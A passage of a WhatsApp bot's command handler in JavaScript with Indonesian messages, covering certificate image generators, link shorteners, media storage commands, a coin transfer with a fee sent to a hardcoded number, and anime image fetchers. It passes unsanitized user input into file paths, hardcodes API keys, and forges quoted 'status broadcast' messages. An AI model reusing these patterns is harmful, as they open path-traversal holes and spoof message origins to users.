				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}fftourserti4 databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/FFSerti4/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'fftourserti5': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}fftourserti5 databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/FFSerti5/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'mltourserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}mltourserti databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(12)
				anu = await getBuffer(`https://onlydevcity.xyz/MLTourSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'mltourserti2': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}mltourserti2 databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/MLTourSerti2/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'mltourserti3': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}mltourserti3 databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/MLTourSerti3/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'mltourserti4': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}mltourserti4 databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/MLTourSerti4/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'mltourserti5': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}mltourserti5 databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(13)
				anu = await getBuffer(`https://onlydevcity.xyz/MLTourSerti5/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'pubgtourserti': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}pubgtourserti databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(14)
				anu = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'pubgtourserti2': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}pubgtourserti2 databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(15)
				anu = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti2/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'pubgtourserti3': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}pubgtourserti3 databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(15)
				anu = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti3/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'pubgtourserti4': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}pubgtourserti4 databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(15)
				anu = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti4/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'pubgtourserti5': 				
				// Subscribe Yoo
				if (!isRegistered) return reply(aml.noregis)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`Textnya Mana Cuy?\nContoh ${prefix}pubgtourserti5 databaseaUhuy`)
				reply (aml.wait)
				ct = body.slice(15)
				anu = await getBuffer(`https://onlydevcity.xyz/PubgTourSerti5/img.php?nama=${ct}`)
				aldi.sendMessage(from, anu, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
		case 'shortlink':
				 // Fix Bug By aldi				
                 if (!isRegistered) return reply(aml.noregis)
				if (isLimit(sender)) return reply(aml.limitend)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				aldi.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://tobz-api.herokuapp.com/api/bitly?url=${args[0]}&apikey=BotWeA`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink2':
				 // Follow My Github	
                 if (!isRegistered) return reply(aml.noregis)
				if (isLimit(sender)) return reply(aml.limitend)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				aldi.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://hujanapi.herokuapp.com/api/cuttly?url=${args[0]}&apikey=trial2k21`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.Short}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink3':
				 // Follow My Github	
                 if (!isRegistered) return reply(aml.noregis)
				if (isLimit(sender)) return reply(aml.limitend)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				aldi.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://hujanapi.herokuapp.com/api/shorturl?url=${args[0]}&apikey=trial2k21`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.Short}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink4':
				 // Follow My Github	
                 if (!isRegistered) return reply(aml.noregis)
				if (isLimit(sender)) return reply(aml.limitend)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				aldi.updatePresence(from, Presence.composing) 
				data = await fetchJson(`http://lolhuman.herokuapp.com/api/shortlink2?url=${args[0]}&apikey=${lolhuman}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink5':
				 // Follow My Github	
                 if (!isRegistered) return reply(aml.noregis)
				if (isLimit(sender)) return reply(aml.limitend)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				aldi.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://onlydevcity.herokuapp.com/api/short/vgd?url=${args[0]}&apikey=${onlydev}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.link}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink6':
				 // Follow My Github	
                 if (!isRegistered) return reply(aml.noregis)
				if (isLimit(sender)) return reply(aml.limitend)
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				aldi.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://onlydevcity.herokuapp.com/api/short/isgd?url=${args[0]}&apikey=${onlydev}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.link}`
				reply(hasil)
				await limitAdd(sender)
				break
			case 'addvn':
				if (!isQuotedAudio) return reply('Reply vnnya blokk!')
				svst = body.slice(7)
				if (!svst) return reply('Nama audionya apa su?')
				boij = JSON.parse(JSON.stringify(odc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await aldi.downloadMediaMessage(boij)
				audionye.push(`${svst}`)
				fs.writeFileSync(`./src/audio/${svst}.mp3`, delb)
				fs.writeFileSync('./src/audio.json', JSON.stringify(audionye))
				aldi.sendMessage(from, `Sukses Menambahkan Vn ke dalam database\nSilahkann Cek dengan cara ${prefix}listvn`, MessageType.text, { quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}__", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }} }) 
				break
			case 'getvn':
			   if (args.length < 1) return reply('Masukan nama yang terdaftar di list vn')
				namastc = body.slice(7)
				anu = fs.readFileSync(`./src/audio/${namastc}.mp3`)
				aldi.sendMessage(from, anu, audio, { mimetype: 'audio/mp4',  quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}__", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, ptt: true })
				break
			case 'getsticker':
			case 'gets':
			if (!isGroup) return reply(aml.groupo)
			   if (args.length < 1) return reply('Masukan nama yang terdaftar di list sticker')
				namastc = body.slice(12)
				result = fs.readFileSync(`./src/sticker/${namastc}.webp`)
				aldi.sendMessage(from, result, sticker)
				break
           case 'liststicker':
				teks = 'Sticker List :\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\nTotal : ${setiker.length}`
				aldi.sendMessage(from, teks.trim(), extendedText, {  quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}__", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, contextInfo: { "mentionedJid": setiker } })
				break
			case 'listvn':
			case 'vnlist':
				teks = 'List Vn:\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\nTotal : ${audionye.length}`
				aldi.sendMessage(from, teks.trim(), extendedText, {  quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}__", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, contextInfo: { "mentionedJid": audionye } })
				break
			case 'addimage':
				if (!isQuotedImage) return reply('Reply imagenya blokk!')
				svst = args.join('  ')
				if (!svst) return reply('Nama imagenya apa su?')
				boij = JSON.parse(JSON.stringify(odc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await aldi.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./src/image/${svst}.jpeg`, delb)
				fs.writeFileSync('./src/image.json', JSON.stringify(imagenye))
				aldi.sendMessage(from, `Sukses Menambahkan image ke dalam database\nSilahkan cek dengan cara ${prefix}listimage`, MessageType.text, { quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}__", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }} }) 
				await limitAdd(sender)
				break
			case 'getimage':
            case 'getimg':
			   if (args.length < 1) return reply('Masukan nama yang terdaftar di list image')
				namastc = args.join('  ')
				anu = fs.readFileSync(`./src/image/${namastc}.jpeg`)
				aldi.sendMessage(from, anu, image, {  quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}__", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, caption: `Result From Database : gs.jpeg` })
				break
			case 'imagelist':
			case 'listimage':
				teks = 'List Image :\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\nTotal : ${imagenye.length}`
				aldi.sendMessage(from, teks.trim(), extendedText, {  quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}__", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, contextInfo: { "mentionedJid": imagenye } })
				break
			case 'addvideo':
				if (!isQuotedVideo) return reply('Reply videonya blokk!')
				svst = args.join('  ')
				if (!svst) return reply('Nama videonya apa su?')
				boij = JSON.parse(JSON.stringify(odc).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await aldi.downloadMediaMessage(boij)
				videonye.push(`${svst}`)
				fs.writeFileSync(`./src/video/${svst}.mp4`, delb)
				fs.writeFileSync('./src/video.json', JSON.stringify(videonye))
				aldi.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}__", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }} }) 
				break
			case 'getvideo':
			   if (args.length < 1) return reply('Masukan nama yang terdaftar di list video')
				namastc = args.join('  ')
				anu = fs.readFileSync(`./src/video/${namastc}.mp4`)
				aldi.sendMessage(from, anu, video, { mimetype: 'video/mp4', quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}__", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }} }) 
				break
			case 'listvideo':
			case 'videolist':
				teks = 'List Video :\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\nTotal : ${videonye.length}`
				aldi.sendMessage(from, teks.trim(), extendedText, {  quoted: { mek: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_${namabot}__", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('image/odc.jpeg')} }}, contextInfo: { "mentionedJid": videonye } })
				break   
			
		case 'delete':
		case 'del':
		case 'd':
			if (!isRegistered) return reply(aml.noregis)
		    if (isBanned) return reply(aml.baned)
            if (isLimit(sender)) return reply(aml.limitend)
			if (!isGroup)return reply(aml.group)
			if (!isGroupAdmins)return reply(mess.only.admin)
			aldi.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
			break
		case 'dadu':
			if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
			ranp = getRandom('.png')
			rano = getRandom('.webp')
		        random = `${Math.floor(Math.random()*  6)}`
                    hasil = 'https://www.random.org/dice/dice' + random + '.png'
			exec(`wget ${hasil} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			fs.unlinkSync(ranp)
			if (err) returnreply (aml.wait)
			kontol = fs.readFileSync(rano)
			aldi.sendMessage(from, kontol, sticker, {quoted: fkontak})
			fs.unlinkSync(rano)
			})
			break
		case 'googlesearch':
		if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
		if (isLimit(sender)) return reply(aml.limitend)
				if (args.length < 1) return reply(`textnya mana om?`)
				ct = body.slice(14)
				ll1 = ct.split("|")[0];
                ll2 = ct.split("|")[1];
				ll3 = ct.split("|")[2];
				reply(`[❕] Loading`)
				anu = await fetchJson(`https://dapuhy-apikey.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${xteam}`)
				kontol = await getBuffer(anu.result.url)
				aldi.sendMessage(from, kontol, image, { quoted: fkontak, caption: 'Nih Hasilnya...' })
				break
				case 'transfer':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (!q.includes('|')) return  reply(ind.wrongf())
                const tujuan = q.substring(0, q.indexOf('|') - 1)
                const jumblah = q.substring(q.lastIndexOf('|') + 1)
                if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
                if (jumblah < 100 ) return reply(`minimal transfer 100`)
                if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk mekakukan transfer`)
                const tujuantf = `${tujuan.replace("@", '')}@s.whatsapp.net`
                fee = 0.005*   jumblah
                hasiltf = jumblah - fee
                addKoinUser(tujuantf, hasiltf)
                confirmATM(sender, jumblah)
                addKoinUser('6282158549899@s.whatsapp.net', fee)
                reply(`「 SUKSES 」\n\npengiriman uang telah sukses\ndari : +${sender.split("@")[0]}\nke : +${tujuan}\njumblah transfer : ${jumblah}\npajak : ${fee}`)
                break
				case 'limit':
				   if (!isRegistered) return reply(aml.noregis)
		           if (isBanned) return reply(aml.baned)
				   checkLimit(sender)
					break
		case 'bitly':
                 if (!isRegistered) return reply(aml.noregis)
				if (isLimit(sender)) return reply(aml.limitend)
				if (isBanned) return reply(aml.baned)
				aldi.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://tobz-api.herokuapp.com/api/bitly?url=${args[0]}&apikey=${TobzKey}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
				reply(hasil)
				await limitAdd(sender)
				break
				case 'tinyurl':
                 if (!isRegistered) return reply(aml.noregis)
				if (isLimit(sender)) return reply(aml.limitend)
				if (isBanned) return reply(aml.baned)
				aldi.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://api.xteam.xyz/shorturl/tinyurl?url=${args[0]}&APIKEY=${xteam}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'cuttly':	
                 if (!isRegistered) return reply(aml.noregis)
				if (isLimit(sender)) return reply(aml.limitend)
				if (isBanned) return reply(aml.baned)
				aldi.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://hujanapi.herokuapp.com/api/cuttly?url=${args[0]}&apikey=trial2k21`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.Short}`
				reply(hasil)
				await limitAdd(sender)
				break
				case 'sakura':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
					if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					anu = await fetchJson(`https://fdciabdul.tech/pinterest?keyboard=sakura`, {method: 'get'})
					sak = JSON.parse(JSON.stringify(anu));
					kura =  sak[Math.floor(Math.random() *   sak.length)];
					nye = await getBuffer(kura)
					aldi.sendMessage(from, nye, image, { caption: 'SAKURA', quoted: fkontak })
					await limitAdd(sender) 
					break 
				case 'rem':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(limits.limitend(pushname))
					reply (aml.wait)
					anu = await fetchJson(`https://fdciabdul.tech/pinterest?keyboard=rem`, {method: 'get'})
					sasu = JSON.parse(JSON.stringify(anu));
					ke =  sasu[Math.floor(Math.random() *   sasu.length)];
					nye = await getBuffer(ke)
					aldi.sendMessage(from, nye, image, { caption: 'REM-CHAN', quoted: fkontak })
					await limitAdd(sender) 
					break
				case 'chika':
                                if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
                                if (isLimit(sender)) return reply(limits.limitend(pushname))
					reply (aml.wait)
					anu = await fetchJson(`https://fdciabdul.tech/pinterest?keyboard=FujiwaraChika`, {method: 'get'})
					sasu = JSON.parse(JSON.stringify(anu));
					ke =  sasu[Math.floor(Math.random() *   sasu.length)];
					nye = await getBuffer(ke)
					aldi.sendMessage(from, nye, image, { caption: 'CHIKA-SAN', quoted: fkontak })
					await limitAdd(sender) 
					break
				case 'kurumi2':
				if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					anu = await fetchJson(`https://fdciabdul.tech/pinterest?keyboard=anime+karumi`, {method: 'get'})
					kur = JSON.parse(JSON.stringify(anu));
					imi =  kur[Math.floor(Math.random() * kur.length)];
					nye = await getBuffer(imi)
					aldi.sendMessage(from, nye, image, { caption: 'kurumi-chan', quoted: fkontak })
					await limitAdd(sender) 
					break 
					case 'spatrick':
                    //[â—] case by DappaGanz
					if (!isRegistered) return reply(aml.noregis)
		if (isBanned) return reply(aml.baned)
				if (isLimit(sender)) return reply(aml.limitend)
					reply (aml.wait)
					dppa = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=${lolhuman}`)
					aldi.sendMessage(from, dppa, sticker, {quoted: fkontak})
					await limitAdd(sender)
					break 
					case 'stickerwm':
					case 'swm':
					case 'stikerwm': 
					if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
					if (!isRegistered) return reply(aml.noregis)
		            if (isBanned) return reply(aml.baned)
				    if (isLimit(sender)) return reply(aml.limitend)
                    if (type === 'imageMessage' || isQuotedImage){
                    var kls = args.join('  ')
                    const getBuffer = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
                    const dlfile = await aldi.downloadMediaMessage(getBuffer)
                  reply (aml.wait)
                    const bas64 = `data:image/jpeg;base64,${dlfile.toString('base64')}`
